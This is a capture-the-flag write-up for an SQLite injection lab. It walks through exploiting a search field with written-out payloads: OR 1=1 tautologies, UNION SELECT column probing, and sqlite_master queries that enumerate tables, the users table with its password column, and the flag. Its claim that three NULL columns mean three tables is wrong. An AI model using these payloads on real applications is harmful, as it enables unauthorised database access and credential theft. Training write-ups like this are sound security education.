### More SQLi Challenge 358

Access the lab, login with `ad|ad`, server throw 500 and `query` to db

![thorw 500](image.png)

Try basic payload

![enter](image-1.png)

but no flag here, try to exploit `Search` function

try find `'`

![alt text](image-2.png)

No record show, but try `' OR 1=1--`

All record show

![alt text](image-3.png)

To confirm it maybe vulnerable to sql injection attack, send more payload return `false` like `'OR 1=2--`,

No record show, we confirm it vunerable to sql attack

![alt text](image-4.png)

Try to sent `union` payload, it's return `500 - Internal Sever Error` when query `false`

![alt text](image-5.png)

Found when `' UNION SELECT NULL, NULL, NULL--`, it's mean this database have 3 table

![alt text](image-6.png)

Try inject a text, it's ok

![alt text](image-7.png)

Try some payload to get version of database but we all `500` 

![sql cheat sheet](image-9.png)

![alt text](image-8.png) 

Found `SQLite` in hints

![sqlite](image-10.png)

let's use some query sqlite

TRy to show version, `' union select (select sqlite_version()), 'ez2', 'ez3'--`, SQLite 3.31.1

![alt text](image-11.png)

Using `search=' union select (SELECT tbl_name FROM sqlite_master WHERE type='table'), 'ez2', 'ez3'--`, get `users` tables

![table](image-14.png)
Usign `search=' union select (SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='users'), 'ez2', 'ez3'--`, get `users` structure through `CREATE` query

![CREATE query](image-13.png)

Found `users` tables have `name, password, id` column, let retrieving information
Found `hints` tables have `id, info` column, let retrieving information
Found `more_tables` tables have `id, flag` column, let retrieving information

Let's extract `flag`

![alt text](image-15.png)



#### REFERENCE

[SQLITE cheat sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)


